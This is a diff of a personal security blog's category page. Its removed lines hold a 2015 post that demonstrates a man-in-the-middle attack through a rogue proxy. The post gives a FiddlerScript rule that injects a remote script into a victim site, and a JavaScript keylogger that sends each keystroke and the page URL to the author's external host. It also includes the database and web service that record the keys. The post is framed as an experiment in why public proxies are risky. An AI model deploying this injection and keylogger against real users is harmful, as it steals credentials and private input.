@@ -1,179 +1,429 @@
-<!DOCTYPE HTML>
-<html>
+<!doctype html>
+<html class="theme-next   use-motion ">
 <head>
-  <meta charset="utf-8">
-  
-  <title>Security | vijshank</title>
-  <meta name="author" content="Vijay Shankar">
-  
-  
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-
-  
-  <meta property="og:site_name" content="vijshank"/>
-
-  
-    <meta property="og:image" content="undefined"/>
-  
-
-  <link href="/favicon.png" rel="icon">
-  <link rel="alternate" href="/atom.xml" title="vijshank" type="application/atom+xml">
-  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
-  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
-  
-
-</head>
-
-
-<body>
-  <header id="header" class="inner"><div class="alignleft">
-  <h1><a href="/">vijshank</a></h1>
-  <h2><a href="/">a.k.a. Vijay Shankar</a></h2>
-</div>
-<nav id="main-nav" class="alignright">
-  <ul>
-    
-      <li><a href="/">Home</a></li>
-    
-      <li><a href="/archives">Archives</a></li>
-    
-      <li><a href="/whoami">whoami</a></li>
-    
-  </ul>
-  <div class="clearfix"></div>
-</nav>
-<div class="clearfix"></div></header>
-  <div id="content" class="inner">
-    <div id="main-col" class="alignleft"><div id="wrapper">
-<h2 class="archive-title category">Security</h2>
-
-
-  
-    <article class="post">
-  
-  <div class="post-content">
-    <header>
-      
-        <div class="icon"></div>
-        <time datetime="2015-02-11T15:38:45.000Z"><a href="/2015/02/11/Man-in-the-middle-and-the-javascript-keylogger/">Feb 11 2015</a></time>
-      
-      
-  
-    <h1 class="title"><a href="/2015/02/11/Man-in-the-middle-and-the-javascript-keylogger/">Man-in-the-middle and the JavaScript Keylogger</a></h1>
-  
-
-    </header>
-    <div class="entry">
-      
-        <p>This blog post is a simple experiment to show how to implement a JavaScript keylogger and test it. </p>
-<p>When a website is HTTPS enabled, it ensures that your communication to the website is encrypted and is protected against <a href="http://en.wikipedia.org/wiki/Man-in-the-middle_attack" target="_blank" rel="external">man-in-the-middle (MITM)</a> attacks. MITM attacks look very unlikely to happen, but they are actually very likely. </p>
-<h3 id="Take_a_look_at_how_MITM_attack_works:"><strong>Take a look at how MITM attack works:</strong></h3>
-<p><img src="/2015/02/11/Man-in-the-middle-and-the-javascript-keylogger/mitm1.svg" alt=""></p>
-<p><strong>How can a hacker intercept the traffic of the user?</strong><br>It could be through malware which was spread to the victim or even through tapping into hardware such as a switch or router the victim connects to. </p>
-<p>In our experiment, we take the all too familiar case where the victim uses a proxy server found online to bypass the network restrictions. This is a common scenario in workplaces, schools and colleges where a lot of popular sites are made inaccessible by the network admin. In such cases, users usually search online for a proxy server and use it. In our scenario, the proxy server is owned by the hacker which enables the attack:</p>
-<p><img src="/2015/02/11/Man-in-the-middle-and-the-javascript-keylogger/mitm2.svg" alt=""></p>
-<p>A lot of sites have a http homepage, but have a link on their homepage for login that takes the user to a https enabled page that asks for credentials (Example - <a href="http://amazon.com/" target="_blank" rel="external">amazon.com</a>). </p>
-<p><strong>What’s wrong with this approach?</strong><br>The hacker who can intercept the http homepage can also add a prompt for the user’s credentials at the homepage itself. This login prompt can also be specifically crafted with CSS that matches the website, so as not to look suspicious to the user. </p>
-<p>If you look at step (4) in the above picture, the hacker sends back the requested webpage to the user with some malicious code attached. In our scenario, we attach two things to the page that is returned to the user from the proxy server in step (4):<br>1) <em>A javascript keylogger</em> that sends every keypress made on the page to a webservice that is somewhere hosted by the hacker.<br>2) <em>A login prompt</em> (if not already present in the page) asking the user to enter the credentials to the site. </p>
-<h2 id="The_Experiment"><strong>The Experiment</strong></h2>
-<p><strong>Our experiment setup:</strong></p>
-<p><img src="/2015/02/11/Man-in-the-middle-and-the-javascript-keylogger/mitm3.svg" alt=""></p>
-<h3 id="Setting_up_the_proxy_server:"><strong>Setting up the proxy server</strong>:</h3>
-<p>To simplify this step, I am using Fiddler as the proxy server. After installing fiddler,  enable “Allow remote computers to connect” in options:</p>
-<p><img src="/2015/02/11/Man-in-the-middle-and-the-javascript-keylogger/FiddlerOptions.png" alt=""></p>
-<p>Now you will be able to see the http traffic of anyone using this machine:port as their proxy server. The next step is to automatically attach our malicious code when sending the response back to the victim. This can be done using fiddler’s fiddlerscript feature. Press Ctrl + R to open FiddlerScript. The below modification to OnBeforeResponse() will make sure that the keylogger script is added to every page request returned to the victim. </p>
-<figure class="highlight [C#]"><figcaption><span>FiddlerScript</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">OnBeforeResponse</span><span class="params">(oSession: Session)</span> </span>{</div><div class="line">        </div><div class="line">        <span class="keyword">if</span> (oSession.hostname.Contains(<span class="string">"InsertTheVictimSiteHere.com"</span>)) </div><div class="line">        {</div><div class="line">            oSession.utilDecodeResponse();</div><div class="line">            oSession.utilReplaceInResponse(<span class="string">'&lt;/head&gt;'</span>, <span class="string">'&lt;script src="http://lekeylogger.azurewebsites.net/Logger.js"&gt;&lt;/script&gt;'</span> + <span class="string">'&lt;/head&gt;'</span>);</div><div class="line">        }</div><div class="line">        </div><div class="line">    }</div></pre></td></tr></table></figure>
-
-<p>The keylogger code <em>Logger.js</em> will be downloaded by the user’s browser. Note that in our experiment, the Logger.js file is hosted on the server where the webservice is hosted (lekeylogger.azurewebsites.net).</p>
-<h3 id="The_JavaScript_Keylogger:"><strong>The JavaScript Keylogger</strong>:</h3>
-<p>We implement the keylogger through a function to handle the onkeypress event. Inside the function, we send the pressed key to our service. We also send the an unique InstanceID, SequenceNumber and the current url of the page along with the keystroke:</p>
-<figure class="highlight [C#]"><figcaption><span>JavaScript Keylogger</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">InstanceID = <span class="built_in">Math</span>.random().toString(<span class="number">36</span>).slice(<span class="number">2</span>);</div><div class="line">SequenceNumber = <span class="number">0</span>;</div><div class="line"><span class="built_in">document</span>.onkeypress = <span class="function"><span class="keyword">function</span> <span class="params">(evt)</span> </span>{</div><div class="line">    evt = evt || <span class="built_in">window</span>.event</div><div class="line">    key = <span class="built_in">String</span>.fromCharCode(evt.charCode)</div><div class="line">    <span class="keyword">if</span> (key) {</div><div class="line">        $.ajax({</div><div class="line">            url: <span class="string">'http://lekeylogger.azurewebsites.net/api/Key'</span>,</div><div class="line">            type: <span class="string">'Post'</span>,</div><div class="line">            data: <span class="built_in">JSON</span>.stringify({ InstanceID: InstanceID, SequenceNumber: ++SequenceNumber, KeyValue: key, Referer: <span class="built_in">document</span>.URL }),</div><div class="line">            contentType: <span class="string">"application/json"</span>,</div><div class="line">            success: <span class="function"><span class="keyword">function</span> <span class="params">(data)</span> </span>{ },</div><div class="line">            error: <span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>{ }</div><div class="line">        });</div><div class="line">    }</div><div class="line">}</div></pre></td></tr></table></figure>
-
-<h3 id="The_WebService_to_record_keystrokes:"><strong>The WebService to record keystrokes</strong>:</h3>
-<p>We create a database with the following table:</p>
-<figure class="highlight [SQL]"><figcaption><span>Keys table:</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="operator"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> [dbo].[Keys]</span></div><div class="line">(</div><div class="line">	[InstanceID] <span class="keyword">NVARCHAR</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>, </div><div class="line">    [SequenceNumber] <span class="built_in">INT</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</div><div class="line">    [Referer] <span class="keyword">NVARCHAR</span>(<span class="number">256</span>) <span class="literal">NULL</span>,  </div><div class="line">    [KeyValue] <span class="keyword">NCHAR</span>(<span class="number">1</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>, </div><div class="line">    <span class="keyword">CONSTRAINT</span> [PK_Keys] <span class="keyword">PRIMARY</span> <span class="keyword">KEY</span> ([InstanceID], [SequenceNumber])</div><div class="line">)</div></pre></td></tr></table></figure>
-
-<p>The service is a pretty simple Asp.NET webapi:</p>
-<figure class="highlight [C#]"><figcaption><span>Web service to log keystrokes:</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">using</span> KeyLogger.Models;</div><div class="line"><span class="keyword">using</span> System.Web.Http;</div><div class="line"></div><div class="line">namespace KeyLogger.Controllers</div><div class="line">{</div><div class="line">    <span class="keyword">public</span> <span class="keyword">class</span> KeyController : ApiController</div><div class="line">    {</div><div class="line">        <span class="keyword">public</span> IHttpActionResult <span class="title">Post</span>(Key key)</div><div class="line">        {</div><div class="line">            <span class="keyword">using</span> (KeyDBEntities keyDB = <span class="keyword">new</span> KeyDBEntities())</div><div class="line">            {</div><div class="line">                keyDB.Keys.Add(key);</div><div class="line">                keyDB.SaveChanges();</div><div class="line">            }</div><div class="line"></div><div class="line">            <span class="keyword">return</span> Ok();</div><div class="line">        }</div><div class="line">    }</div><div class="line">}</div></pre></td></tr></table></figure>
-
-<p>The setup is complete. On changing to this proxy server and visiting the website, the keystrokes made in the browser window are sent to the service and logged in our database:</p>
-<p><img src="/2015/02/11/Man-in-the-middle-and-the-javascript-keylogger/query.png" alt=""></p>
-<p>That’s all folks!</p>
-<p>P.S: The code for this experiment is at: <a href="https://github.com/cracker2excel/lekeylogger" target="_blank" rel="external">https://github.com/cracker2excel/lekeylogger</a></p>
-
-      
-    </div>
-    <footer>
-      
-        
-        
-      
-      <div class="clearfix"></div>
-    </footer>
-  </div>
-</article>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
 
 
 
-  
-
-  <nav id="pagination">
-  
-  
-  <div class="clearfix"></div>
-</nav>
-</div></div>
-    <aside id="sidebar" class="alignright">
-  <div class="search">
-  <form action="//google.com/search" method="get" accept-charset="utf-8">
-    <input type="search" name="q" results="0" placeholder="Search">
-    <input type="hidden" name="q" value="site:vijshank.com">
-  </form>
-</div>
-
-  
-<div class="widget tag">
-  <h3 class="title">Categories</h3>
-  <ul class="entry">
-  
-    <li><a href="/categories/Security/Fiddler/">Fiddler</a><small>1</small></li>
-  
-    <li><a href="/categories/Nothing-in-particular/">Nothing in particular</a><small>1</small></li>
-  
-    <li><a href="/categories/Security/">Security</a><small>1</small></li>
-  
-  </ul>
-</div>
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
 
 
-  
-</aside>
-    <div class="clearfix"></div>
-  </div>
-  <footer id="footer" class="inner"><div class="alignleft">
-  
-  &copy; 2015 Vijay Shankar
-  
-</div>
-<div class="clearfix"></div></footer>
-  <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
-<script src="/js/jquery.imagesloaded.min.js"></script>
-<script src="/js/gallery.js"></script>
 
 
-<script type="text/javascript">
-var disqus_shortname = 'vijshank';
 
-(function(){
-  var dsq = document.createElement('script');
-  dsq.type = 'text/javascript';
-  dsq.async = true;
-  dsq.src = '//' + disqus_shortname + '.disqus.com/count.js';
-  (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
-}());
+
+
+
+
+
+
+
+  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css"/>
+
+
+
+
+  <link href="//fonts.googleapis.com/css?family=Lato:300,400,700,400italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+
+
+
+<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=0.4.5.2" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=0.4.5.2" />
+
+
+
+
+
+
+<meta name="description">
+<meta property="og:type" content="website">
+<meta property="og:title" content="vijshank's blog">
+<meta property="og:url" content="http://vijshank.com/categories/Security/index.html">
+<meta property="og:site_name" content="vijshank's blog">
+<meta property="og:description">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="vijshank's blog">
+<meta name="twitter:description">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var CONFIG = {
+    scheme: 'Mist',
+    sidebar: 'hide',
+    motion: true
+  };
 </script>
 
+  <title> Category: Security | vijshank's blog </title>
+</head>
 
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  <!--[if lte IE 8]>
+  <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'>
+    <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode">
+      <img src="http://7u2nvr.com1.z0.glb.clouddn.com/picouterie.jpg" border="0" height="42" width="820"
+           alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today or use other browser ,like chrome firefox safari."
+           style='margin-left:auto;margin-right:auto;display: block;'/>
+    </a>
+  </div>
+<![endif]-->
+  
+
+
+
+
+
+
+  <div class="container one-column ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">vijshank's blog</span>
+      <span class="logo-line-after"><i></i></span>
+	  <span class="site-description">Hacks, code and random tech stuff</span>
+    </a>
+  </div>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu ">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-home fa-fw"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-archive fa-fw"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-th fa-fw"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-tags fa-fw"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+
+      
+      
+    </ul>
+  
+
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div id="content" class="content">
+          
+
+  <section id="posts" class="posts-collapse">
+    <div class="collection-title">
+      <h2 >
+        Security
+        <small>Category</small>
+      </h2>
+    </div>
+
+    
+      
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+
+      <h1 class="post-title">
+        
+            <a class="post-title-link" href="/2015/02/11/Why-public-proxies-are-bad-for-you/" itemprop="url">
+              
+                <span itemprop="name">Why public proxies are bad for you</span>
+              
+            </a>
+        
+      </h1>
+
+      <div class="post-meta">
+        <time class="post-time" itemprop="dateCreated"
+              datetime="2015-02-11T21:08:45+05:30"
+              content="Feb 11 2015" >
+          02-11
+        </time>
+      </div>
+
+    </header>
+  </article>
+
+
+    
+  </section>
+
+  
+
+
+
+        </div>
+
+        
+
+
+        
+
+      </div>
+
+      
+        
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview sidebar-panel  sidebar-panel-active ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" src="/images/default_avatar.jpg" alt="Vijay Shankar" itemprop="image"/>
+          <p class="site-author-name" itemprop="name">Vijay Shankar</p>
+        </div>
+        <p class="site-description motion-element" itemprop="description"></p>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">3</span>
+              <span class="site-state-item-name">posts</span>
+            </a>
+          </div>
+
+          <div class="site-state-item site-state-categories">
+            <a href="/categories">
+              <span class="site-state-item-count">3</span>
+              <span class="site-state-item-name">categories</span>
+              </a>
+          </div>
+
+          <div class="site-state-item site-state-tags">
+            <a href="/tags">
+              <span class="site-state-item-count">5</span>
+              <span class="site-state-item-name">tags</span>
+              </a>
+          </div>
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/cracker2excel" target="_blank">
+                  
+                    <i class="fa fa-github"></i> GitHub
+                  
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://twitter.com/vijshankar" target="_blank">
+                  
+                    <i class="fa fa-twitter"></i> Twitter
+                  
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://www.facebook.com/vijshank" target="_blank">
+                  
+                    <i class="fa fa-facebook"></i> Facebook
+                  
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+      </section>
+
+      
+
+    </div>
+  </aside>
+
+
+      
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy;  2015 - 
+  <span itemprop="copyrightYear">2016</span>
+  <span class="with-love">
+    <i class="icon-next-heart fa fa-hand-spock-o"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Vijay Shankar</span>
+</div>
+
+<div class="powered-by">
+  Powered by <a class="theme-link" href="http://hexo.io">Hexo</a>
+</div>
+
+<div class="theme-info">
+  Theme -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+</div>
+
+
+
+      </div>
+    </footer>
+
+    <div class="back-to-top"></div>
+  </div>
+
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  
+  
+    <script type="text/javascript">
+      postMotionOptions = {stagger: 100, drag: true};
+    </script>
+  
+
+
+  
+    
+    
+
+  
+
+    <script type="text/javascript">
+      var disqus_shortname = 'vijshank';
+      var disqus_identifier = 'categories/Security/index.html';
+      var disqus_title = '';
+      var disqus_url = '';
+
+      function run_disqus_script(disqus_script){
+        var dsq = document.createElement('script');
+        dsq.type = 'text/javascript';
+        dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+      }
+
+      run_disqus_script('count.js');
+      
+    </script>
+  
+
+
+  
+
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript" src="/js/fancy-box.js?v=0.4.5.2"></script>
+
+
+  <script type="text/javascript" src="/js/helpers.js?v=0.4.5.2"></script>
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
+<script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>
+
+<script type="text/javascript" src="/js/motion.js?v=0.4.5.2" id="motion.global"></script>
+
+
+  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+
+  <script type="text/javascript" src="/js/bootstrap.js"></script>
+
+  
+  
+
+  
+  
 
 </body>
 </html>
